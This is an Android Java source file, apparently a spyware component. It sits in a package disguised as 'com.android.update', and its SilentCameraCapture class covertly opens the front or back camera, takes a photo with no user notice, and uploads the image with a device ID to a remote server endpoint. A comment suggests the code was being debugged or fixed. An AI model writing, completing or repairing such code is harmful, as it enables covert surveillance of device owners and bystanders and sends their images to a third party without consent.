package com.android.update;

import android.content.Context;
import android.graphics.ImageFormat;
import android.hardware.camera2.*;
import android.media.Image;
import android.media.ImageReader;
import android.os.Handler;
import android.os.HandlerThread;
import android.util.Log;
import android.Manifest;
import android.content.pm.PackageManager;
import androidx.annotation.NonNull;
import androidx.core.app.ActivityCompat;
import java.io.ByteArrayOutputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Collections;

public class SilentCameraCapture {

    private static final String TAG = "SilentCam";

    public static void captureCamera(Context context, int lensFacing) {
        try {
            CameraManager manager = (CameraManager) context.getSystemService(Context.CAMERA_SERVICE);
            for (String cameraId : manager.getCameraIdList()) {
                CameraCharacteristics characteristics = manager.getCameraCharacteristics(cameraId);
                Integer facing = characteristics.get(CameraCharacteristics.LENS_FACING);
                if (facing != null && facing == lensFacing) {

                    HandlerThread handlerThread = new HandlerThread("CameraThread");
                    handlerThread.start();
                    Handler backgroundHandler = new Handler(handlerThread.getLooper());

                    ImageReader reader = ImageReader.newInstance(1280, 720, ImageFormat.JPEG, 2);

                    if (ActivityCompat.checkSelfPermission(context, Manifest.permission.CAMERA)
                            != PackageManager.PERMISSION_GRANTED) {
                        Log.e(TAG, "CAMERA permission not granted");
                        return;
                    }

                    manager.openCamera(cameraId, new CameraDevice.StateCallback() {
                        @Override
                        public void onOpened(@NonNull CameraDevice camera) {
                            try {
                                CaptureRequest.Builder captureRequest =
                                        camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
                                captureRequest.addTarget(reader.getSurface());
                                captureRequest.set(CaptureRequest.CONTROL_MODE,
                                        CaptureRequest.CONTROL_MODE_AUTO);

                                reader.setOnImageAvailableListener(readerListener -> {
                                    Image image = null;
                                    try {
                                        image = reader.acquireLatestImage();
                                        if (image != null) {
                                            byte[] buffer = new byte[image.getPlanes()[0].getBuffer().remaining()];
                                            image.getPlanes()[0].getBuffer().get(buffer);
                                            image.close();
                                            image = null;
                                            uploadToServer(context, buffer, lensFacing);
                                        }
                                    } catch (Exception e) {
                                        Log.e(TAG, "Image capture failed: " + e.getMessage());
                                    } finally {
                                        if (image != null) image.close();
                                        try { reader.close(); } catch (Exception ignored) {}
                                        camera.close();
                                        handlerThread.quitSafely();
                                    }
                                }, backgroundHandler);

                                camera.createCaptureSession(
                                        Collections.singletonList(reader.getSurface()),
                                        new CameraCaptureSession.StateCallback() {
                                            @Override
                                            public void onConfigured(@NonNull CameraCaptureSession session) {
                                                try {
                                                    session.capture(captureRequest.build(), null, backgroundHandler);
                                                } catch (CameraAccessException e) {
                                                    Log.e(TAG, "Capture error: " + e.getMessage());
                                                }
                                            }

                                            @Override
                                            public void onConfigureFailed(@NonNull CameraCaptureSession session) {
                                                Log.e(TAG, "Session config failed");
                                            }
                                        }, backgroundHandler);

                            } catch (CameraAccessException e) {
                                Log.e(TAG, "Open failed: " + e.getMessage());
                            }
                        }

                        @Override
                        public void onDisconnected(@NonNull CameraDevice camera) {
                            camera.close();
                        }

                        @Override
                        public void onError(@NonNull CameraDevice camera, int error) {
                            Log.e(TAG, "Camera error: " + error);
                            camera.close();
                        }
                    }, backgroundHandler);

                    break;
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Camera2 error: " + e.getMessage());
        }
    }

    private static void uploadToServer(Context context, byte[] imageData, int lensFacing) {
        new Thread(() -> {
            try {
                boolean isFront = lensFacing == CameraCharacteristics.LENS_FACING_FRONT;
                String endpoint = isFront ? "upload_front_photo" : "upload_back_photo";
                String filename = (isFront ? "front_" : "back_") + System.currentTimeMillis() + ".jpg";

                URL url = new URL(ServerConfig.endpoint(endpoint));
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setDoOutput(true);
                conn.setConnectTimeout(10000);
                conn.setReadTimeout(10000);
                conn.setRequestProperty("Content-Type", "application/octet-stream"); // ✅ Fixed: was missing
                conn.setRequestProperty("Content-Disposition", "attachment; filename=\"" + filename + "\"");
                conn.setRequestProperty("Device-ID", DeviceUtils.getDeviceId(context));

                OutputStream os = conn.getOutputStream();
                os.write(imageData);
                os.flush();
                os.close();

                Log.d(TAG, endpoint + " upload done. Code: " + conn.getResponseCode());
            } catch (Exception e) {
                Log.e(TAG, "Upload failed: " + e.getMessage());
            }
        }).start();
    }
}
